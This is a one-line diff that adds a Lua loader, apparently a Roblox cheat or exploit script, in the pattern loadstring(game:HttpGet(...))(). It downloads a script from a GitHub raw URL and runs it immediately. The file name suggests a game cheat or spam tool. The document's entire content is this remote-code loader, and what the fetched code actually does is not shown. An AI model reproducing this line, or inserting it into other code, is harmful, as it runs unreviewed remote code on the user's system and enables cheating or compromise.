@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/1-speed-keyboard-escape-candy-chocolate-spam3-3xo4go6cgp2daf.lua"))()
